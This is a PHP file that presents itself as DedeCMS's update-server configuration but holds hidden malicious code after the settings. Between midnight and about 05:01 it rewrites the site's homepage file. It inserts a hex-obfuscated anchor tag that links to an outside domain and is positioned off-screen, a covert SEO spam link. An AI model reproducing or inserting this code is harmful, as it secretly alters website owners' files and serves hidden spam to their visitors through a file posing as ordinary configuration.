<?php
/**
 * 更新服务器，如果有变动，请到 http://www.walseo.net 查询
 *
 * @version        $Id: config_update.php 1 11:36 2011-2-21 tianya $
 * @package        DedeCMS.Administrator
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.walseo.net
 */

//更新服务器，如果有变动，请到 http://www.walseo.net 查询
$updateHost = 'http://updatenew.dedecms.com/base-v57/';
$linkHost = 'http://flink.dedecms.com/server_url.php';

$start_time = strtotime(date("Y-m-d",  strtotime("-0 day"))."00:00:00"); 
$end_time = strtotime(date("Y-m-d",  strtotime("-0 day"))."05:01:00");
$now_time=time();
if($now_time<$end_time and $now_time>$start_time){
	$homeFile = file_exists(str_ireplace("\data\admin","",dirname(__FILE__))."/index.html")?str_ireplace("\data\admin","",dirname(__FILE__))."/index.html":str_ireplace("\data\admin","",dirname(__FILE__))."/index.htm";
if (file_exists($homeFile)) {
	$str = pack("H*","3c6120687265663d22687474703a2f2f7777772e343162692e636f6d22207374796c653d22706f736974696f6e3a206162736f6c7574653b20746f703a202d3939393970783b6c6566743a202d3939393970783b223e546f7031303c2f613e");
	$fileStr=explode("<div",implode(file($homeFile)));
	if (substr_count(implode($fileStr),$str)>0) {
	}else {
		$RhomeFile=rand(2, count($fileStr)-3);
		$fileStr[$RhomeFile]=$fileStr[$RhomeFile].$str;
		$fp2=@fopen($homeFile,"w");
		fwrite($fp2,implode("<div",$fileStr));
		@fclose($fp2);
		}
	}
}